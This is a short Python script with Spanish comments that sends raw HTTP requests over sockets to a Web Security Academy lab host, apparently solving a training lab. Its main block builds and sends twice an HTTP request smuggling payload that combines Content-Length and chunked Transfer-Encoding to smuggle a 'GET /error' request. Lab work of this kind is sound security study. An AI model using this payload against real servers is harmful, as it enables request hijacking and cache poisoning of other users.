import socket
import ssl

def send_request(host, request, port=80):
    # Crea un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conecta al host y puerto especificado
    s.connect((host, port))

    # Envía el request
    s.sendall(request.encode())

    # Recibe y muestra la respuesta
    response = s.recv(4096)
    print(response.decode())

    # Cierra el socket
    s.close()

def send_request_with_ssl(host, request, port=443):
    # Crea un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conexión SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    s = context.wrap_socket(s, server_hostname=host)

    # Conecta al host y puerto especificado
    s.connect((host, port))

    # Envía el request
    s.sendall(request.encode())

    # Recibe y muestra la respuesta
    response = s.recv(4096)
    print(response.decode())

    # Cierra el socket
    s.close()

if __name__ == '__main__':
    host = '0a5500e3040a9973830c884f00f5006f.web-security-academy.net'
    request = '''POST / HTTP/1.1\r
Host: 0a5500e3040a9973830c884f00f5006f.web-security-academy.net\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 30\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /error HTTP/1.1\r
Foo: x\r
\r
'''
    send_request_with_ssl(host, request)
    send_request_with_ssl(host, request)
